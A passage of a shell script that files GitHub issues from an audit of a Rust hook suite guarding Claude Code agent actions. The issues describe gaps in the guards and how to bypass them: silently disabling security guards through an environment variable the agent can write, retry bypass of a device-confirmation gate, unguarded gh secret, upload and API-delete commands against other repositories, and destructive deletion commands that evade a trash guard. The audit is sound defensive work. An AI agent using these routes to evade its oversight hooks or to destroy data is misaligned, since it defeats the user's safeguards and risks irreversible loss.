Both secret-guard agents flagged this independently."

file_issue \
  "[P2] prevent-secret-writes: rm_targets/redirect_target not quote-aware → false blocks on benign commands" \
  "## What
\`crates/cadence/src/prevent_secret_writes.rs:25-41\` (\`rm_targets\`, \`in_rm\` never resets) and \`:11-22\` (\`redirect_target\` scans the raw string); gate is a plain substring \`.contains(\".env\")\` (\`:46\`/\`:56\`).

## Failure mode
\`rm_targets\` flips \`in_rm\` true at the first \`rm\` token and treats *every* later non-flag token as an rm target, across \`&&\`/\`;\`/quotes. With the substring gate, benign commands that merely mention \`.env\` get falsely blocked: \`rm tmp.log && echo \"see the .env file in docs\"\`; \`git commit -m \"redirect output with > .env carefully\"\`; \`cat settings.environment\` (\`.environment\` contains \`.env\`).

## Fix
Tokenize quote-aware, stop \`rm\` target collection at chain operators, and match \`.env\` as a path component rather than a bare substring.

## Severity
P2 — false blocks on legitimate \`rm\`/\`git commit -m\`/reads (P1-class friction, but moderate trigger likelihood).

## Related
Inverse of the write-guard bypass P1s."

file_issue \
  "[P2] guard-gh-write: write-verb coverage gap (release upload, secret set, variable set, ruleset, project)" \
  "## What
\`crates/guardrails/src/guard_gh_write.rs:20-24\` (\`WRITE_ACTIONS\` noun/verb enumeration: nouns \`pr|issue|release|label|repo|gist|workflow\`, verbs omit \`upload\`).

## Failure mode
\`gh release upload\` is missed (\`upload\` not a listed verb); whole families \`gh secret …\`, \`gh variable …\`, \`gh ssh-key add\`, \`gh gpg-key add\`, \`gh ruleset …\`, \`gh project …\` are missed (nouns not listed). These accept \`-R owner/repo\` and write GitHub state, but \`is_write_command\` returns false, so ownership is never checked.

## Repro
\`gh release upload v1.0.0 ./artifact.zip -R evil/victim\`; \`gh secret set TOKEN -R evil/victim -b value\`.

## Fix
Extend the noun/verb tables to cover the writeful subcommand families (release upload, secret/variable set, ruleset, project, ssh-key/gpg-key add).

## Severity
P2 — a class of gh writes is entirely unguarded; most require admin on the target, lowering real-world severity.

## Related
gh-write coverage family with the chain P0."

file_issue \
  "[P2] guard-gh-dangerous: misses irreversible repo delete via the API form" \
  "## What
\`crates/guardrails/src/guard_gh_dangerous.rs:11-12\`: \`GH_REPO_DELETE = \bgh\s+repo\s+delete\b\` only matches the subcommand form.

## Failure mode
\`gh api -X DELETE /repos/<owner>/<repo>\` permanently deletes a repository just as irreversibly, but never matches \`GH_REPO_DELETE\`, so this guard allows it (\`:59\`). For an owned repo, guard-gh-write also allows it (correctly, by ownership), so nothing enforces the 'deletes are irreversible — do it via github.com' policy that \`gh repo delete\` is blocked under.

## Repro
\`gh api -X DELETE repos/cameronsjo/some-owned-repo\` (vs the blocked \`gh repo delete cameronsjo/some-owned-repo\`).

## Fix
Match the API delete form (\`gh api … -X DELETE …/repos/<owner>/<repo>\`) in guard-gh-dangerous alongside the subcommand form.

## Severity
P2 — the irreversibility safety net has a parallel API path around it.

## Related
gh-write chain P0; regex-too-tight family."

file_issue \
  "[P2] dispatch: CADENCE_DISABLE silently disables enforcement guards with no trace and no protected floor" \
  "## What
\`src/main.rs:467-472\`:

\`\`\`rust
if let Ok(disabled) = ... && disabled.split(',').any(|h| h.trim() == name) {
    process::exit(0);
}
\`\`\`

## Failure mode
Disabling any guard by name exits 0 with no stderr/stdout, and there is no allowlist exempting security guards. \`CADENCE_DISABLE=git-safety,prevent-secret-writes\` silently neuters them. Contrast \`CADENCE_BYPASS=1\` (\`:387\`), which prints a warning on every call. Hook env comes from \`.claude/settings.json\`'s \`env\` block, and no guard blocks Write/Edit to \`settings.json\` (\`guard-dotfiles\` is opt-in and targets production dotfiles), so an agent editing \`settings.json\` can persist a silent disable. (The *parsing* is robust — a typo disables nothing.)

## Repro (verified)
\`CADENCE_DISABLE=git-safety\` on \`git push --force origin main\` -> exit 0, empty output. \`CADENCE_BYPASS=1\` on the same -> exit 0 but prints the bypass warning.

## Fix
Emit a one-line notice when a guard is disabled (as bypass does), and refuse to disable a protected set of security guards via env.

## Severity
P2 — an enforcement guard's block becomes a silent exit 0 with no in-band signal that protection was off.

## Related
Adjacent to the effort-gate note (no live regression there)."

file_issue \
  "[P2] session: find_own resolves by 8-char id suffix → colliding manual session-ids cross-corrupt records" \
  "## What
\`crates/session/src/registry.rs:107-115\` (\`find_own\` returns the first dir entry ending in \`.{short_id}.json\`) + \`identity.rs:102-108\` (\`short_id\` = first 8 chars) + \`cli.rs:65-73\` (declare upsert).

## Failure mode
Real Claude Code UUIDs make collision negligible, but the documented manual path passes \`--session-id\` explicitly, and human/sequential ids collide trivially: \`session-1\` and \`session-2\` both yield short_id \`session-\`. \`find_own\` returns whichever file \`read_dir\` lists first — potentially the other session's record — and \`run_declare\` then mutates and re-writes it, overwriting the peer's file.

## Repro
Two sessions invoked \`--session-id session-1\` / \`--session-id session-2\`; one runs \`session declare\` and clobbers the other's record / reads the wrong drift baseline.

## Fix
Detect ambiguity in \`find_own\` (more than one match -> error/skip), or key the file on the full id.

## Severity
P2 — state corruption that lies to peers, but only on the manual \`--session-id\` path with deliberately-colliding ids.

## Related
Concurrency family with the stale-sweep P0."

file_issue \
  "[P2] terminology: is_excluded_path substring match over-excludes (free pass on coincidental paths)" \
  "## What
\`crates/cadence/src/terminology.rs:118-124\`: \`path.contains(\"cadence-hooks/\")\` (and \`.claude/hooks/\`, \`.claude/rules/\`).

## Failure mode
The exclusion is an unanchored substring with no repo-root anchoring, so any path that merely contains \`cadence-hooks/\` gets a terminology free pass: \`/tmp/cadence-hooks/evil/x.md\`, a sibling \`~/work/legacy-cadence-hooks/notes.md\`, or any scratch dir named \`cadence-hooks/\`. The intent is to exempt *this repo's own* source; the match is far broader and trivially self-grantable.

## Repro
\`Write\` containing a prohibited term to \`/tmp/cadence-hooks/x.md\` -> Allow.

## Fix
Anchor to the actual repo root (canonical absolute prefix) rather than a bare substring.

## Severity
P2 — a hard guard is disarmed by a path coincidence and is self-grantable, but requires a specific path.

## Related
Substring-exclusion family; false-PASS class."

file_issue \
  "[P2] memory_guard: counts the Edit fragment, not the resulting file — 200-line MEMORY.md cap is bypassable" \
  "## What
\`crates/cadence/src/memory_guard.rs:40-48\`: \`let content = match input.content() { Some(c) => …, None => fs::read_to_string … }; let line_count = content.lines().count();\` — uses \`content()\`, not \`effective_content()\`.

## Failure mode
For an \`Edit\`, \`content()\` returns the \`new_string\` *fragment* (core lib.rs:231), so \`line_count\` is the appended hunk, not the resulting file. An Edit adding 30 lines to a 195-line MEMORY.md yields \`line_count == 30 -> Allow\` while the file becomes 225 lines. Repeated Edits grow MEMORY.md unbounded — the very file (loaded into every session's context) this guard exists to cap. For \`MultiEdit\`, \`content()\` is \`None\`, so it measures the *pre-edit* file.

## Repro
\`Edit\` on \`…/memory/MEMORY.md\` with a small \`new_string\` that appends 40 lines to a near-limit file -> Allow.

## Fix
Count \`effective_content()\`'s total lines (the simulated resulting file), as the frontmatter validator does.

## Severity
P2 — the hard 200-line cap is evadable through the normal way Claude updates its memory index (Edit, not Write).

## Related
The MultiEdit content-validator bypass shares the content() vs effective_content() root cause."

file_issue \
  "[P2] memory_guard: path heuristic over-matches → false block on legitimate project files" \
  "## What
\`crates/cadence/src/memory_guard.rs:16-22\`: \`is_memory_path\` = \`path.contains(\"/memory/\")\`; \`is_memory_md\` = \`path.ends_with(\"/MEMORY.md\")\`.

## Failure mode
The guard targets the Claude auto-memory location but matches *any* path with a \`/memory/\` segment. A real project file such as \`docs/memory/MEMORY.md\` (a memory-bank pattern) or \`assets/memory/MEMORY.md\` over 200 lines is hard-blocked with an auto-memory error message that makes no sense in that context. Any non-MEMORY \`*/memory/*.md\` over 300 lines gets a spurious nudge.

## Repro
\`Write\` a 250-line \`docs/memory/MEMORY.md\` into a real project -> hard block.

## Fix
Scope the path test to the auto-memory root (require \`/.claude/projects/\` or a configured memory dir) rather than a bare \`/memory/\` substring.

## Severity
P2 — false block on valid content (the inverse over-match of the fragment-count bypass).

## Related
Same guard as the fragment-count P2."

file_issue \
  "[P2] metrics log-subagent: writeln! is a multi-syscall write that tears under concurrent appends" \
  "## What
\`crates/metrics/src/log_subagent.rs:43\`: \`let _ = writeln!(file, \"{record}\");\`

## Failure mode
\`writeln!\` on a bare \`File\` calls \`write\` once per formatting fragment that \`serde_json::Value\`'s Display emits (token by token), i.e. many separate syscalls on the O_APPEND fd, not one. Each syscall appends atomically, but the record is split across all of them, so a concurrent appender can interleave its bytes and produce torn lines. The sibling loggers were written to avoid exactly this: \`log_commit.rs:110-115\` and \`gate.rs:127-136\` build the whole line and do a single \`write_all\` with comments explaining the hazard; \`log_subagent\` is the outlier.

## Repro
An agent team with several parallel subagents firing \`SubagentStart\`/\`SubagentStop\` near-simultaneously, each appending to the global \`~/.claude/metrics/subagents.jsonl\`.

## Fix
Build \`record + \"\n\"\` and do a single \`write_all\`, matching the other two loggers.

## Severity
P2 — torn/interleaved JSONL lines break downstream parsing; observability-only, recoverable.

## Related
Loggers integrity family."

file_issue \
  "[P2] metrics: price table missing claude-opus-4-8 and claude-fable-5 → commit cost silently logged as \$0" \
  "## What
\`crates/metrics/prices.json:7-38\` (consumed by \`crates/metrics/src/compute_cost.rs:13-15\`).

## Failure mode
The embedded table covers \`claude-opus-4-7/4-6\`, \`claude-sonnet-4-6/4-5\`, \`claude-haiku-4-5\` — but not \`claude-opus-4-8\` or \`claude-fable-5\`, both current model IDs. \`compute_cost\` returns \`0.0\` for any model absent from the table, and \`log_commit\` still writes the record, so the cost is silently wrong. \`_meta.lastVerified\` is \`2026-05-16\`, already stale.

## Repro
Any \`git commit\` in a session running \`claude-opus-4-8\` (or fable-5): \`scan_tokens\` reads the model, lookup misses, \`costUsd: 0.0\`.

## Fix
Add the current model IDs (and their per-MTok input/output/cache prices) to \`prices.json\`; consider warning on an unknown model instead of silently returning 0.

## Severity
P2 — cost-per-commit metrics under-report (often \$0) for the flagship models in active use; reprocessable once patched.

## Related
Loggers integrity family."

file_issue \
  "[P2] metrics log-commit: reads and parses the entire transcript on every commit (hot-path latency)" \
  "## What
\`crates/metrics/src/log_commit.rs:77-80\` (\`std::fs::read_to_string(transcript_path)\`) + \`scan_tokens.rs:67-73\` (\`transcript.lines().filter_map(from_str).collect()\`).

## Failure mode
\`log_commit\` slurps the whole transcript .jsonl and builds a Vec of every assistant message, even when only the tail past the \`from\` marker is needed. This runs synchronously on \`PostToolUse:Bash\` for every \`git commit\`; Claude Code holds the tool result until the hook returns, so the cost is paid on the user's commit latency.

## Repro
A long session (multi-MB transcript) with frequent commits: each commit re-reads and re-parses from byte zero.

## Fix
Bound work to the unscanned tail (seek/stream past the marker) rather than O(full transcript) per commit.

## Severity
P2 — growing per-commit latency and memory as the session lengthens; observability logger on the hot path.

## Related
Loggers integrity family."

file_issue \
  "[P2] session: post-plan-mode execution session discloses the planning session as a phantom live peer" \
  "## What
\`crates/session/src/start.rs:55-74\` (SessionStart sweep + disclosure) and \`registry.rs:15\` (\`DEFAULT_STALE_MINUTES = 10\`). Plan mode and post-approval execution run as two distinct Claude Code sessions (different session_ids), each registered as its own lane in \`.claude/sessions/\`.

## Failure mode
When plan mode exits and a fresh execution session starts, the just-finished planning session is still inside the 10-minute staleness window, so the execution session's SessionStart disclosure lists it as a *live peer*. The new session reasons about phantom multi-session coordination — 'another session is running… oh, it was the planning session, nevermind' — applying shared-checkout caution (don't switch branches, sequence writes, investigate the peer) against what is really its own immediate predecessor phase, not a concurrent collaborator. The planning lane then ages out a few minutes later. (Observed live this session: the execution session spent real effort investigating the planning lane \`russet-compass\` as a parallel hunt before concluding it was the predecessor.)

## Repro
Enter plan mode, approve a plan, let Claude Code start the execution session. The execution session's startup disclosure names the planning session as a live peer in the same checkout.

## Fix
Recognize the plan->execute handoff so the predecessor is disclosed as 'superseded by this session' (or suppressed) rather than as a concurrent peer — e.g. carry a lineage/transcript link across the plan-mode boundary, or have the execution session mark the planning lane superseded on registration. Distinguishing a 'planning' intent so it is rendered as a predecessor, not a peer, would also work.

## Severity
P2 — misleading coordination state: a fresh session is steered into unwarranted peer-coordination caution against its own predecessor, costing attention every post-plan session. Self-resolving once the planning lane ages out, hence not P1.

## Related
Compounds with the stale-sweep P0 (the planning lane can also be swept mid-investigation) and the session-coordination disclosure family."

echo ""
echo "=== P3 — latent risk / polish ==="

file_issue \
  "[P3] core: effective_content() reads the normalized path and fails open on read error" \
  "## What
\`crates/core/src/lib.rs:244-279\`, esp. \`:253\` \`let path = self.file_path()?;\` -> \`:254\` \`let on_disk = std::fs::read_to_string(&path).ok()?;\`.

## Failure mode (latent)
For Edit/MultiEdit the simulated document is read from \`file_path()\`, which returns the *normalized* path (null bytes stripped, \`\\\` -> \`/\`, trailing slash/space trimmed) — not necessarily the literal target the Edit tool writes to. A trailing-space/backslash/null path variant the FS treats as distinct means the guard could validate a different file than the one mutated. Independently, \`read_to_string\` returns Err on non-UTF-8 bytes -> \`.ok()?\` -> None -> the consuming guard allows.

## Today's blast radius
Only \`validate_skill_frontmatter\` (a non-security linter) uses \`effective_content()\`; the secret guards match on filename via \`file_path()\` and never read the file, so they do not inherit this. Bounded today.

## Fix
Read the literal write target (or canonicalize consistently), and decide a non-allow default for unreadable/non-UTF-8 content before any *security* content guard adopts this helper.

## Severity
P3 — no security guard uses it today; flagged so a future content security guard doesn't inherit a silent fail-open bypass.

## Related
ADR-0001 fail-open; the content-validator MultiEdit findings."

file_issue \
  "[P3] session: ensure_git_excluded no-ops in a git worktree — the recommended multi-session setup" \
  "## What
\`crates/session/src/registry.rs:180-203\`, early return at \`:186\`: \`if !repo_root.join(\".git\").is_dir() { return; }\`.

## Failure mode
In a linked worktree \`.git\` is a *file*, so the function returns without excluding \`.claude/sessions/\`. CLAUDE.md explicitly recommends 'git worktree per session' as the structural fix for shared-checkout collisions, so the exclude is skipped in exactly the configuration the project steers users toward. If the worktree's shared \`info/exclude\` doesn't already carry the line, the per-session JSON files surface as untracked and can be swept into a commit.

## Repro
A multi-session setup where the only checkouts are worktrees: session files appear in \`git status\` and risk leaking into a PR.

## Fix
Resolve the gitdir from the \`.git\` file and write to the common/worktree \`info/exclude\` regardless of plain-checkout vs worktree.

## Severity
P3 — coordination state (intent, branch, declared paths) leaked into git status / a commit; disclosure of internal state, not corruption.

## Related
Session coordination family."

file_issue \
  "[P3] check_security_patterns: coverage gaps (eval/exec/os.system/pickle.load) + scans fragment/stale content" \
  "## What
\`crates/rules/src/check_security_patterns.rs:16-117\` (PATTERNS) and \`:169-175\` (content selection via \`input.content()\`).

## Failure mode (absence)
The Python table flags \`pickle.loads\`, \`yaml.load(\`, \`shell=True\`, \`trust_remote_code\`, \`__import__(\`, but misses the canonical RCE primitives \`eval(\`, \`exec(\`, \`os.system(\`, and \`pickle.load(\` (the file-object variant — the \`pickle.loads\` pattern requires the trailing \`s\`). JS misses \`eval(\`, \`document.write(\`, \`dangerouslySetInnerHTML\`.

## Failure mode (simulation)
Uses \`input.content()\`: for an Edit it scans only the \`new_string\` fragment (wrong line numbers); for a MultiEdit \`content()\` is None, so it reads the *pre-edit* file, scanning stale content and missing introduced patterns.

## Fix
Add the missing primitives; route through \`effective_content()\` so it scans the simulated resulting document with correct line numbers.

## Severity
P3 — advisory-only (never blocks, \`:189\`), so these are missed hints, not a broken gate.

## Related
content() vs effective_content() family."

file_issue \
  "[P3] check-idle-return: marker keyed only by repo hash (no session) → an active peer masks an idle session's nudge" \
  "## What
\`crates/guardrails/src/check_idle_return.rs:61-68\`: \`marker_path\` hashes only \`repo_root\` into \`.claude-last-edit-{hash:x}\` — no PID/session component.

## Failure mode
Every session editing in the same repo reads and overwrites the single marker with \`now\`. In a multi-session checkout an actively-editing peer continually refreshes the timestamp, so when a different session returns after a long idle it reads the peer's recent \`now\`, computes a tiny gap, and the re-orientation nudge never fires. (A future-dated marker from clock skew yields \`saturating_sub -> 0\`, also suppressing it.)

## Repro
Two sessions in one repo; A idles 30+ min while B keeps editing; A returns and edits -> no idle nudge.

## Fix
Include a session/PID component in the marker (as \`guard_browser_device\` uses \`session_id\`), so idleness is per-session.

## Severity
P3 — idle-return nudge suppressed under concurrent sessions; nudge-only, never blocks.

## Related
Marker-scoping family with warn-main-branch and dismiss-main-branch."

file_issue \
  "[P3] warn-main-branch: once-per-session marker keyed on \$PPID (never set) → re-warns on every edit" \
  "## What
\`crates/guardrails/src/warn_main_branch.rs:140-146\`: \`let ppid = std::env::var(\"PPID\")…unwrap_or_else(std::process::id);\` then marker \`…-warned-{hash:x}-{ppid}\`.

## Failure mode
\`PPID\` is a shell builtin, not exported to child processes — grepping the repo (and hooks.json) shows \`PPID\` is *read* here and in \`guard_browser_device\` but *written nowhere*. At runtime \`env::var(\"PPID\")\` is Err and the code falls back to \`process::id()\`. Hooks run as a fresh process per invocation, so \`process::id()\` differs every call -> the marker path is unique every call -> \`already_warned\` is always false -> the nudge re-fires on every edit on main. (\`docs/test-audit-report.md\` already flags this; \`marker_uses_ppid_not_pid\` only tests the env-set branch, which never executes in production.)

## Fix
Key the marker on \`input.session_id()\` (\`core/src/lib.rs:287\`), as \`guard_browser_device\` correctly does.

## Severity
P3 — over-firing nudge; erodes the guard by training the user to reflexively dismiss the main-branch warning.

## Related
Marker-scoping family; the snooze (dismiss-main-branch) P2."

file_issue \
  "[P3] guard-browser-device: marker written before the block → a blind retry opens the gate with no device handshake" \
  "## What
\`crates/guardrails/src/guard_browser_device.rs:90,97-98\`: first call does \`fs::write(&marker, \"\")\` *then* \`block(...)\`; the next call hits \`if marker.exists() { return allow() }\`.

## Failure mode
The marker records nothing about whether a device was actually selected, so a model that re-issues the identical tool call (without \`list_connected_browsers\`/\`select_browser\`) is allowed on attempt 2, and the action lands on the unconfirmed device — the exact auto-mode retry behavior CLAUDE.md describes. Once written, the gate stays open for the whole session even if the user later switches to a genuinely different physical device.

## Repro
\`mcp__claude-in-chrome__navigate\` (blocked, marker written) -> immediately re-run the same tool with no handshake -> allowed.

## Fix
Gate on evidence of an actual device selection (a select_browser having occurred / a recorded device id), not merely 'a block has been shown once'.

## Severity
P3 — device-confirm gate reduces to a single advisory message any retry no-ops; flair/safety nudge, not enforcement.

## Related
Marker-lifecycle family."

file_issue \
  "[P3] dismiss-main-branch snooze: repo-wide marker binds non-consenting peers and the read path never enforces the 24h cap" \
  "## What
\`crates/guardrails/src/dismiss_main_branch_warn.rs:49-51,54-57\` (read) vs \`:117\` (cap enforced only on write). Marker at \`<repo_root>/.git/cadence-hooks/main-branch-snoozed-until\`.

## Failure mode
(1) The marker is repo-wide, not session-scoped: one session running \`dismiss-main-branch-warn --for 2h\` disables the main-branch guard for *every peer session* in that checkout, including ones that never opted in. (2) \`is_snoozed_at\` is \`matches!(parsed, Some(until) if until > now_epoch)\` with no upper bound; \`MAX_SNOOZE_SECONDS\` (24h) is checked only in \`run_dismiss\` (\`:117\`). A marker with a far-future epoch (pre-cap binary, hand-edited, or any future code path that bypasses run_dismiss) suppresses the warning effectively forever. (Parse failure is safe — unparseable -> not snoozed.)

## Repro
(1) Session A: \`dismiss-main-branch-warn --for 2h\`; peer B in the same checkout edits on main with no nudge. (2) A marker containing a year-2099 epoch -> permanent suppression.

## Fix
Scope the marker per session, and clamp the parsed expiry to \`now + MAX_SNOOZE_SECONDS\` on the read path too.

## Severity
P3 — main-branch warning suppressed for non-consenting peers and potentially indefinitely; the warning is a nudge, not a block.

## Related
Marker-scoping family with warn-main-branch."

file_issue \
  "[P3] obsidian trash_guard: only rm is matched — unlink, find -delete, shred, truncation slip through" \
  "## What
\`crates/obsidian/src/trash_guard.rs:23\`: \`if !command.contains(\"rm\")\`.

## Failure mode
The guard protects the vault from destructive ops but considers only \`rm\`. An agent reaching for \`unlink note.md\`, \`find /vault -name '*.md' -delete\`, \`shred -u note.md\`, \`truncate -s 0 note.md\`, or \`: > note.md\` destroys vault files with none of these containing \`rm\`, bypassing Obsidian's \`.trash/\` recoverability. \`find … -delete\` in particular is a natural bulk-deletion tool.

## Repro
From inside the vault: \`find . -name '*.md' -delete\` or \`unlink note.md\`.

## Fix
Match the common destructive verbs (unlink, find -delete, shred, truncate, \`: >\`/\`> file\` truncation) in addition to \`rm\`.

## Severity
P3 — vault-protection coverage is narrower than its purpose; non-rm deletion shapes are unguarded.

## Related
Same guard as the quoted-path P1."

file_issue \
  "[P3] lab: persona ledger grows unbounded and is fully re-parsed on every session start" \
  "## What
\`crates/lab/src/persona.rs:264-269\` (\`ledger_contains\`); read sites \`nudge.rs:45-49\`, \`gate.rs:115-117\`.

## Failure mode
\`~/.claude/persona/personas.jsonl\` is append-only with one line per session and no rotation or cap. Every SessionStart nudge and every staging-dir Write reads the whole file and parses every line just to dedupe one \`session_id\`. No size bound, compaction, or index.

## Repro
Normal heavy use over time — thousands of sessions accumulate thousands of lines; each new session start re-parses all of them.

## Fix
Bound storage (rotation) and make the dedupe cheap (tail/index check) rather than a full O(ledger) parse on the session-start path.

## Severity
P3 — slow unbounded growth plus a linearly-growing parse on session start; flair/observability.

## Related
Loggers/lab growth family."

echo ""
echo "==============================="
echo "Filed: $SUCCESSES, Failed: $FAILURES"
